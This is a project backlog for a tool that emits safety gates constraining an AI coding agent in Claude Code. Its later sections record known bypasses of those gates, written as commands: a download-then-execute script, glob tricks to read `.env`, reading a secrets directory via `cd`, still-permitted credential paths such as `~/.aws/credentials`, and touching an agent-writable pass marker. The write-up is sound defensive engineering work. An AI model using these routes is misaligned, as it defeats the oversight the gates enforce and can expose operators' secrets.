# Deferred backlog — unified tracking

The single index of deferred / not-yet-fixed work. It consolidates items that
were previously scattered across `docs/changelog.md` ("Review findings recorded
but NOT fixed"), the `post-retrofit-tasks` memory, the milestone memory, and
per-session checkpoints. **This document is canonical going forward** — add new
deferrals here; the source lists remain as historical record.

**Snapshot:** `main @ 3c0a2de`, 2026-07-21 (after the 2.4.0 fold + closeout:
PR #8/#9/#10 merged, PR #4 closed). None of the items below block 2.4.0.

Status legend: `open` (actionable work) · `decision` (needs an owner call before
work) · `no-action` (reviewed, judged fine as-is; listed so it isn't re-derived)
· `done` (resolved; kept for provenance).

## A. Owner decisions (no code until decided)

| ID | Item | Notes |
|---|---|---|
| A-1 | Emitted-gate fail-open posture under a total parser outage | **DECIDED 2026-07-28 → fail-closed** (v2.6.0, upstream P0-3b). Blocking gates exit 2 with a reason when neither `jq` nor `python3` exists; advisory hooks declare `FAIL_CLOSED=0` and degrade to a logged no-op. `tests/test_retrofit.py` T2.FS7b re-pointed to the new posture. `done` |
| A-2 | Accept-or-schedule this deferred set | Formally treat as deferred-not-forgotten, or queue clusters. `decision` |
| A-3 | Shell-parity judgment call (Milestone B) | SDK gates stricter than the 2.0.0 shell gates on edge cases; parity is a follow-up PR if wanted. `decision` |
| A-4 | Trajectory pruning | `purge_old_state_after_days` has no consumer; auto-deletion unimplemented (new destructive behavior). Partially addressed at v2.6.0 — `.decision-pending-*` is swept on a 7-day window and `hooks.log` rotates at 1 MiB (upstream P3) — but trajectory files under `.claude/logs/` remain unpruned. `decision` |
| A-5 | **Should a `retrofit` install fail closed during its warn-only weeks?** (lens B finding 5) | **REOPENS the retrofit half of A-1.** A-1 was closed for greenfield at v2.6.0 and that half stands: the report demonstrated an executed fail-open in a security gate, and leaving it open pending a decision means continuing to ship it. What was *not* in scope was deciding it for **retrofit**. On `mode: retrofit` with `ROLLOUT_WEEK: 1`, a parser outage now blocks `spec-gate-commit`, `test-gate` and `tdd-gate` — in a week `RETROFIT.md:1250-1255` says blocks **"Nothing (warn-only mode)"**, for the reason the same document gives at `:1246`: day-one blocking *"produces immediate friction that drives bypass behavior"*. A brownfield operator whose week-1 commits are refused with `BLOCKED (fail-closed): unexpected hook error` is precisely the trainer R8.A.6 exists to prevent. **Mechanically available either way:** the ordering is the cause — the retrofit preamble's first act is `CMD="$(jget …)"`, so `hook_fail` fires before `retrofit_should_block` is consulted, but `ROLLOUT_WEEK` is read with `grep -oE` from `rollout-schedule.md` and needs no JSON parser, so it could be resolved first and `FAIL_CLOSED=0` set for a hook the schedule says is warn-only. `secrets-gate` stays fail-closed unconditionally either way (`RETROFIT.md:1134`). **Practical severity is bounded and should be said plainly:** `python3` is a hard prerequisite of the installer, so any machine that ran `bootstrap-install` has a parser; the realistic trigger is a stripped hook environment. **NOT IMPLEMENTED — current behavior (fail-closed in all weeks) is left in place pending the owner's call**, because silently deciding an open owner decision is the exact criticism lens B makes of the previous round. Related disclosure, currently recorded nowhere in the emitted tree: under a *total* parser outage every `PreToolUse` gate exits 2, so every `Bash`/`Read`/`Write`/`Edit`/`Grep`/`Glob` call is refused and the harness is inoperable with no bypass path. That is the posture the upstream report asked for, but an operator should be told it exists | `decision` — **owner** |
| A-6 | **What should `spec-gate-commit`'s predicate actually be?** (lens B finding 6, and the upstream report's own escalation) | P1-2 had **two** structural failures. Failure 1 (the bootstrap commit is impossible — the gate blocked its own `INDEX.md`) is fixed by `ENFORCED_PREFIXES`, now on both substrates. Failure 2 is **not fixed and is not fixable by scoping**: *"the first **code** commit is impossible — `spec-decompose` deliberately produces tasks and behaviors, not filenames, so no source path is ever in the corpus."* Scoping to `src/` does not soften that; it *targets exactly* the files a behavior-oriented task corpus will never name. Executed against a realistic post-`/spec-decompose` corpus, a staged `src/auth.gleam` is still refused. The upstream report escalated this as *"a design question for the maintainer, not just a patch"* and it still is. The shape of the question: should the gate match on **paths** at all, or on something a behavior corpus does contain (spec slug ↔ directory convention, a task-id trailer in the commit message, an explicit `covers:` line in `tasks/*.md`)? Each is a protocol-level convention change, not a hook edit | `decision` — **owner** |

## B. Seam follow-ups (from the 2.0.0 re-cut, PR #10)

| ID | Item | Notes |
|---|---|---|
| B-1 | `SATISFIES_SEAM_VERSION` constant | §8.1 says a protocol commit declares which `seam_version`(s) it satisfies; nothing in code declares it. Bootstrap-side gap. `open` |
| B-2 | `tessera_prd` floor re-cut | Awaits the absorbing Tessera version (P-5 window). Note: re-pinning `targets_seam_version` alone greens check-0 before any runner consumes `build_hooks`. `open` (blocked on Tessera roadmap) |
| B-3 | `claude_code_json_schema_range: TBD` | Open by design (Tessera-runbook referent); resolve when the matrix is known. `open` (blocked) |

## C. 2.2.0 / 2.4.0-fold deferred items

| ID | Item | Source |
|---|---|---|
| C-1 | GR2-03a surfacing notice — fail-loud, non-blocking on model/runtime change (constraints locked, not built) | changelog / milestone memory. `open` |
| C-2 | Retrofit opt-in state-schema — retrofit plans emit `telemetry.md` (and, if hand-set, `design.md`) without matching state fields; `_write_retrofit_state` carries neither `telemetry_export_enabled` nor the two design flags | changelog "recorded but NOT fixed"; extended 2026-07-27 (release review) to cover the design flags. `open` |
| C-3 | Doc-citation normalization pass — pre-existing hook/wrapper citations at older versions (incl. `§6.D` refs) | changelog. `open` |
| C-4 | R8 — eighth IC check (AR2-09b): NOT added at 2.2.0 (golden fixtures + R7 cover the repo-side risk); a forward feature with a recorded cost-of-deferral | changelog `### R8 — Eighth IC check: deferred (AR2-09b)`; `ic_checks.py` has only IC-1..IC-7. `decision` |
| C-5 | AR2-09a — no standalone run-summary template file is emitted (the run-summary is inline in the wrappers) | `templates.py:1083` "[AR2-09a]"; milestone memory. `decision` |

## D. Sub-cap review findings (changelog "recorded but NOT fixed")

Small correctness/cleanup items below the reported cap. All `open`.

| ID | Item |
|---|---|
| D-1 | Progress template `../../learnings/` link → `.claude/learnings/`, but retrofit calibration ledger sits at repo-root `learnings/` (neither mode creates the dir) |
| D-2 | Duplicated ~110-word telemetry question text in `render_interview` vs `run_interactive` (drifted; test pins only one copy) |
| D-3 | `_body_of` helper defined *after* its call sites → two bare-`IndexError` lookups |
| D-4 | Two determinism checks strictly implied by the whole-plan digest check (redundant) |
| D-5 | Dead `not pv` arm in `_telemetry`'s guard (`PROTOCOL_VERSION` is a module literal) |
| D-6 | Redundant proposal rebuild in `test_interview.py` |
| D-7 | Assumption-ledger drift row cites drift-detector config even when `hooks.drift_detector: false` (untested config) |
| D-8 | Freeze-exception ledger numbering not continued by v2.4.0 blocks (format fixed, sequential numbering not) |
| D-9 | Per-task wrapper `log()` emits a literal `\n` (a `.format`-doubling quirk at `templates.py:1444`), so its `hooks.log` entries share one physical line — vs the correct single-backslash form in `auto.sh`/`loop.sh`. Worth its own small freeze-exception. (changelog ~L904, milestone memory) |

## E. Post-retrofit test-coverage queue

Source: `post-retrofit-tasks` memory. Landing structure: a `tests/smoke/` dir.

| ID | Item | Status |
|---|---|---|
| E-1 | E2E CLI smoke (#2) — dry-run vs real greenfield + retrofit fixtures; catches argparse-layer breakage the unit tests bypass | `open` |
| E-2 | Cross-mode regression matrix (#3) — retrofit-install fixture A, then run greenfield suite vs fixture B in-process; proves no global-state leakage | `open` |
| E-3 | `tests/smoke/` layout (#6) — landing dir for E-1/E-2 with golden-tree diff | `open` |
| — | `bin/run-tests` (#4) | `done` — PR #9 |
| — | CI (#5) | `done` — Milestone A (`ic-self-check.yml`) |
| — | Interactive walkthrough test (#1) | `done` — PR #2 |

## F. Lower-priority (2026-05-19 checkpoint + Milestone-B carry-over)

| ID | Item | Source |
|---|---|---|
| F-1 | test-gate grandfather clause — per-module exemption from the `inventory/testing.md` no-test list | 2026-05-19 checkpoint. `open` |
| F-2 | Widen `inventory_scan.py` pyproject regex — misses bare `fastapi` without a version | 2026-05-19 checkpoint. `open` |
| F-3 | Refactor `propose_commands` to take a root path instead of `os.getcwd()` | 2026-05-19 checkpoint. `open` |
| F-4 | Phase 9.6 unnamed config keys — spec decision for retry posture / completion-criteria checklist / audio-cue overrides (currently comments, no keys) | milestone memory / Milestone-B carry-over (NOT the 2026-05-19 checkpoint). `decision` |

## G. Retrofit adversarial-review deferrals (Round 3, v1.6.3)

Source: `post-retrofit-tasks` memory. All `open` unless noted.

| ID | Item |
|---|---|
| G-A4 | Parallel retrofit templates (`_retrofit_claude_md`/implementer/reviewer) not composed — add a mirror-assertion or "byte-mirrors greenfield" docstring |
| G-A5 | `mode_selection_ledger` milestone counter should count non-empty rows, not raw row count |
| G-B1 | `--force` is global; would need per-file scope (Round-3 wrapper guard mitigates the worst case) |
| G-B3 | `legacy_allowlist` rendered in input order — sort-before-emit is the clean follow-up |
| G-D1 | T2 AD class single-case — adversarial hardening (newline-injection, Unicode confusables, kilobyte allowlists) |
| G-D2 | FS5 semantic disambiguation comment (one-line cosmetic) |
| G-F1 | `bootstrap_protocol_version` is write-only telemetry — startup version-mismatch check is a v1.7.x conversation |
| G-F2 | Documented migration path when BOOTSTRAP bumps — RETROFIT-COMPANION change, not installer code |
| G-G2 | Validator/B5 error-message coupling → two-iteration fix cycles (one-line cosmetic) |

## H. Round-2 adversarial-review items — reviewed, no action

Recorded so they aren't re-derived; each judged defensible as-is. All `no-action`.

| ID | Item |
|---|---|
| H-4.2 | Installer seeds `r08_committed` via setdefault — initial-seed contract is defensible post C1+C2 fix |
| H-5.2 | Protocol-version lifecycle — `state.update` semantics are the operator-expected outcome |
| H-3.1 | jq-garbage discrimination — already T2-safe via strict `[ "$_val" = "true" ]` |
| H-3.3 | Two-seam independence — a third runtime seam would significantly grow the preamble |
| H-2.2 | TEMPLATES dict cardinality arithmetic in a commit message — pedantic |

## I. v2.5.0 release-review findings (2026-07-27)

Source: the final holistic adversarial review of the v2.5.0 release candidate
(PRD/Companion requirement-tracing plus scratch installs that executed the
emitted hooks). The review's three fix-before-tag items (F1 disclosure, F2/A-5
Stop-hook gate, F3 jq-fallback booleans) were fixed in the tagged release
(freeze-exception no. 16); the rows below are the recorded residue.

| ID | Item | Notes |
|---|---|---|
| I-1 | Emitted drift/alarm layer is a tier-1 tool-call notice only — tier-2/tier-3 escalation, the tier-3 hard block + `.drift-tier3-*` sentinel, audio dispatch, and the duration/file-read triggers of PRD §6.E are NOT implemented; `audio-alerts.config` now says so and thresholds are baked at install time | `decision` — implement §6.E, or keep the layer advisory and ripple the honest scope into the next PRD rev |
| I-2 | Agent-side autonomous cooperation contract absent from the emitted greenfield tree: no CLAUDE.md loop/goal addenda (Phase 8), no implementer variant blocks (Phase 7 step 3 — sentinel/decision-log/iteration-summary protocol), greenfield `spec-decompose` is a stub with no five-criterion/sixth-criterion classifier or queue-population step while the wrappers hard-require `loop_eligible`/`goal_supervised_eligible`; retrofit DOES emit a real classifier skill (parity inversion) | `open` — highest-value cluster; pairs with E-1/E-2 |
| I-3 | Spec-side: PRD self-contradicts on the version literal Phase 0 writes (`:312` says "2.0.1"; `:1298/:1478/:1837` say "2.0.0"; Companion says a v2.5.0 wizard writes "2.5.0" — impl correctly writes 2.5.0); PRD DELTA-01 head note asserts a header string the artifact never carried | `open` — next PRD doc rev |
| I-4 | Phase 0 step 6 "use verbatim" strings for 9.6/9.7 + the 9.7 trust-ramp surfacing never reached `interview.py` (TEL-01/DS-01 twins ARE byte-pinned; the autonomous-mode asks are plain true/false) | `open` |
| I-5 | Shell `test-gate` staleness check finds only `src/`; the SDK gate covers `("src","lib")` and claims parity — a lib/-only project passes the shell gate forever after one green run | `done` at v2.6.1 — dissolved rather than fixed. Both substrates dropped the pass-marker cache entirely (lens A F4: it was agent-writable and no gate protected it), and the staleness walk went with it, so there are no longer two caches to disagree |
| I-6 | Empty-command degradation: only `commands.test` fails loud with a TODO; empty lint/format degrade to `true` and `ci-mirror` silently passes pushes printing "CI mirror: true" | `open` |
| I-7 | Retrofit `rollout-schedule.md` week table vs behavior: only 3 of 11 hooks honor `ROLLOUT_WEEK` (dependency-gate and ci-mirror block in week 1 against the table's "Nothing" row; the week-2 lint row is unreachable — format-lint never blocks) | `open` |
| I-8 | Second site of the D-9 escape-doubling class: the `O_CREAT\|O_EXCL` claim sentinel is written with `printf '%s\\n'`, so `.loop-active-*`/`.goal-active-*` contain `<pid>` plus a literal backslash-n (templates.py:1519); pair with D-9 for one fix | `open` |
| I-9 | Garbage values for the three opt-in flags exit via an uncaught `ValueError` traceback with exit 1, unlike `resolve_config`'s clean validation block with exit 2 | `open` |
| I-10 | `_command_warnings` / `_retrofit_warnings` are computed but never surfaced by the shipped CLI (`bin/bootstrap-install`); only the plugin command references them | `open` |
| I-11 | `dependency-gate` pattern list misses `uv add`, `poetry add`, `pipenv install`, `cargo add`, `bun add` (all verified rc=0) | `open` |
| I-12 | `sdk_gates/gates.py` callables raise `AttributeError` on a non-dict payload where the shell hooks degrade gracefully; fail-open/fail-closed disposition of a raising PreToolUse hook is the consumer's | `decision` |
| I-13 | `iteration-summary-enforcement` matches ANY `.iteration-summary-*` file, not the current iteration's (the Stop payload carries no task/iteration identity); a stale summary satisfies it forever | `open` |
| I-14 | PRD Phase 2 says interview answers fill `design.md`'s Project-specifics block; the emitted body deliberately ships a signposted placeholder (pre-specified in VALIDATION §5 — don't-guess). Recorded as an intended divergence so it stops being re-derived | `no-action` |
| I-15 | `learnings/mode-selection.md` (the calibration ledger) is emitted **only** by the retrofit overlay (`installer.py:477`, inside the `goal_in` branch). PRD §9.6 step 10 ("Initialize `learnings/mode-selection.md`"), that phase's exit criteria, and the Phase 0.5 preview all require it for **greenfield** goal-mode installs; a `goal_supervised_mode_enabled: true` greenfield dry-run creates the four wrapper/config files and nothing under `learnings/`. Class: DELTA-03 (spec requires, impl omits, tests written from the impl so all suites stay green). Pairs with D-1, which notes neither mode creates the `learnings/` dir at all. Found 2026-07-28 | `open` |

Also verified and left alone by the review (do not re-derive): the seam
binding `2.4.0 @ 251f82f` while main tags 2.5.0 is conformant (commit-pinned
consumers; pin-bump on adoption); wrapper skeletons are conformant under
B-1(b); secrets-gate path-only matching matches its spec.

## J. v2.6.0 upstream-fix residue (2026-07-28)

Sources: `docs/bootstrap-protocol-upstream-bugs-2026-07-28.md` and the two
adversarial lenses run against the fixes themselves —
`docs/lens-a-execution-findings-2026-07-28.md` (F1–F10, execution) and
`docs/lens-b-execution-findings-2026-07-28.md` (findings 1–15, spec conformance
and regression).

**Correction, 2026-07-28.** This section used to open with *"Every P0/P1/P2/P3
finding in that report was fixed at v2.6.0."* That was false when written:
P1-2's second structural failure, P2-4's Under half, and P2-5's
reason-distinguishing half were not fixed, and cluster J recorded none of them.
The v2.6.1 batch fixed most of the residue and the rows below are what it
deliberately left. The rule the false sentence violated is worth stating: a
cluster whose purpose is *"what those fixes deliberately left"* must not
contain the word "every" about work it did not measure.

| ID | Item | Notes |
|---|---|---|
| J-1 | **Quoted-argument verbs no longer match.** `sh -c "git commit"` and friends were caught by the old substring matching; anchoring to command position (P1-4) drops them. Accepted deliberately — the alternative is every false positive the report documented | `no-action` — recorded trade-off, revisit only with a real bypass |
| J-2 | `ENFORCED_PREFIXES` (spec-gate-commit, P1-2) is an editable constant baked into the emitted hook, not a `bootstrap.config.yaml` field. The report called the predicate "configurable"; this is the cheap half. **Now ported to the SDK substrate too** (v2.6.1) so the two agree, but it is still a constant in both. Note this is the *lesser* half of P1-2's residue — see A-5 | `open` |
| J-3 | ~~The SDK substrate carries no Bash-side `secrets-gate` closure … guarded by `permissions.deny` only … asserted in `test_sdk_gates.py`.~~ **Both halves of that row were false, and the gap is now FIXED (v2.6.1, lens A F7).** The emitted deny list contained only `Read`/`Edit`/`Write` rules and no `Bash` rule — Claude Code's path rules do not evaluate command strings — so the route was guarded by *nothing*, not by "`permissions.deny` only". And the assertion cited as proof it was "not silently tolerated" tested `getattr(gates_mod, "_BASH_GATES", {})`, a symbol that has never existed in this repo, making it unconditionally true. `_GATE_EXTRA_MATCHERS` now mirrors `HOOK_EXTRA_EVENTS` and is asserted by equality, and `tests/test_substrate_differential.py` executes the corpus on both substrates | `done` |
| J-4 | Report acceptance criterion 6 — **a tagged release**. ~~Still zero tags in this repo.~~ **Corrected 2026-07-28 (lens B finding 13):** an annotated `v2.5.0` tag dated 2026-07-27 points at an ancestor of HEAD, so criterion 6 is *satisfied for 2.5.0* and pending only for this line of work. J-4's status as "the release blocker" rested on a premise the repo contradicts. Criterion 7 (re-run the two executing lenses against a fresh install of the FIXED version) is deliberately left to an independent reviewer | `open` — tag when 2.6.x is released; no longer a blocker on a false premise |
| J-5 | `permissions.deny` rules are emitted from `never_read_paths` verbatim. **Resolved by reasoning (lens B finding 9), not executed:** under gitignore-style rule semantics the deny list is a strict *subset* of the hook's coverage, never a superset — `secrets/**` contains a `/` so it anchors to the settings directory and misses `sub/secrets/x.txt`, and `.env*` does not match `config.env`. The hook blocks both. So the dialects differ, the divergence is one-directional, and the risk is a *weaker* backstop rather than spurious blocks. The hook remains the enforcement point | `no-action` — benign direction; re-open only if a live harness shows otherwise |
| J-6 | `cost.jsonl` → `session-events.jsonl` is a rename of an emitted artifact. Anything downstream reading the old path breaks. Judged safe (it recorded no cost) but it is a consumer-visible rename inside a MINOR | `no-action` |
| J-7 | **`dependency-gate` segments on separators inside quoted strings.** The finding-1 fix splits the command on newlines and `;&\|` and judges each segment on its own; a separator inside a quoted argument therefore starts a new segment, so `git commit -m "fix; npm install evil"` blocks. Deny-list bias is over-match, and the message names the token, so the cause is legible. The obvious mitigation — skip segments with an unbalanced quote — fixes it in the **fail-open** direction and was declined. *(Note the deliberate asymmetry with `secrets-gate`, which after lens B finding 4 does the opposite and treats a quoted run as one token. The gates differ because the costs differ: a false block on `dependency-gate` names one package and is cleared by editing `deps.md`, while a false block on `secrets-gate` fires on any prose mentioning `.env` and has no override path at all.)* | `no-action` — recorded trade-off, revisit only with a real operator report |
| J-8 | **P2-4's "Under" half is not fixed** — and, unlike the rows above, was *claimed* fixed. The `0ec72d0` commit message said dot-segment matching "satisfies T-1 and P2-4 together"; it satisfies the **Over** half only. Still allowed: `~/.aws/credentials`, `~/.netrc`, `~/.git-credentials`, `credentials.json`, `docker-compose.prod.yml`, `../../etc/passwd`, `/etc/shadow`. **What was deliberately NOT done, and why:** (a) no project-boundary check and no `../` traversal check — the gate matches path *shape*, and deciding that reads outside the project root are refusable is a policy change with a wide blast radius on ordinary work (`cat ../sibling/README.md`); (b) no file-*content* inspection — a gate that greps every read for credential shapes is a different mechanism with a different false-positive profile; (c) **the default `never_read_paths` list was not widened.** That list is operator config, and what a bootstrap project denies by default is the owner's policy call, not the implementer's — the gate correctly enforces whatever is configured. Lens B's own disposition put this finding under "record, do not fix" | `decision` — owner: widen the default deny list, and/or add a boundary/traversal check |
| J-9 | **`.last-eval-pass` is still an agent-writable file a gate trusts.** `test-gate`'s twin was closed by deleting the marker outright (lens A F4), but `eval-gate` has no configured eval command to run in its place, so the marker is the only mechanism it has. Mitigated, not fixed: `settings.json` now emits `Write`/`Edit` denies for the path, which the harness enforces independently of the hook. A Bash `touch` still reaches it — the deny list carries no `Bash` rule (see J-5) — so this is a real residual, not a closed one | `open` — needs a `commands.eval` config field before the marker can go |
| J-10 | **Two-step remote-script execution is not blocked.** `curl https://x.sh > /tmp/a.sh; bash /tmp/a.sh` (the single-pipe form *is* blocked, and the `curl … \| sh` detector deliberately runs before segmentation so it can read across the pipe). Blocking `bash <path>` generically would fire on every ordinary script invocation; correlating a download in one segment with an execution in another is state the gate does not have | `no-action` — recorded gap, the cost of closing it exceeds the benefit |
| J-11 | **`secrets-gate` cannot resolve globs or arbitrary expansions in a Bash command.** `cat .en?` and `cat .{env}` still pass (the shell would expand them; the gate sees the literal token). Fixed in the same pass: intra-token quoting (`cat .en''v`), backslash escapes (`cat .en\v`) and strictly-shaped assignments (`F=.env; cat $F`) — see lens A F8. The residue is the class that requires *evaluating* shell syntax rather than tokenizing it, which a static string scan cannot do; `permissions.deny` is the backstop, and each case needs deliberate intent | `no-action` — inherent limit of scanning a command string |
| J-12 | **`git -c core.editor='vi x' commit` is not matched by `cmd_has_verb`.** The git-global-option run is `( +-[Cc] +[^ ]+\| +-[^ ]+)*`, so an option whose *value contains a space* terminates the run before the verb. Adding a quoted-run alternation to the anchor is possible but materially complicates a regex that four gates share and that must stay pure-bash (lens A F5) | `open` — low frequency, unblocks nothing |
| J-14 | **A bare directory STEM is not blocked on the Bash surface.** `cd secrets; cat prod.yaml` and `tar cf /tmp/s.tar secrets` exit 0; `tar cf /tmp/s.tar secrets/`, `cd secrets/prod` and `cp secrets/prod.yaml /tmp` all still block, as does `Grep{"path":"secrets"}` (the form lens A F6 actually executed). v2.6.1 blocked the bare stem everywhere and that also blocked `grep secrets README.md`, `git commit -m secrets` and `echo secrets` — lens B finding 4's failure mode returning through a different door, in the gate with no override path. Nothing in a token stream distinguishes the path in `cd secrets` from the prose in `git commit -m secrets`; the gate does not track argument position, deliberately. The over-match is paid on ordinary work in every session, the under-match only against an agent already moving a directory wholesale — which has routes the deny-list never covered anyway (`cp -r secrets /tmp/x`, then read the copy). A tripwire that fires on prose gets deleted; a tripwire with a known gap stays installed | `no-action` — recorded trade-off; closing it needs argument-position tracking, which is a different tokenizer |
| J-13 | **`npx`/`uvx`/`dlx`/`exec` blocking is new false-positive surface.** v2.6.1 newly blocks the run-without-installing channels (lens A F3 residue), which means `npx tsc` on a local devDependency now needs an entry in `deps.md`. That is the intended posture — the gate exists for "unapproved software arrives" and not installing first is not a mitigation — but it is the row most likely to generate an operator complaint, so it is recorded rather than discovered | `no-action` — revisit if it proves noisy in practice |

## Priority reading

Highest-signal actionable clusters: **B** (seam follow-ups) and **E** (smoke /
cross-mode coverage). **A** and **F-4** are decisions only. **D** and **G** are
mostly small cleanups. **H** is effectively closed. B-2 and B-3 are blocked on
the Tessera roadmap, not on us.
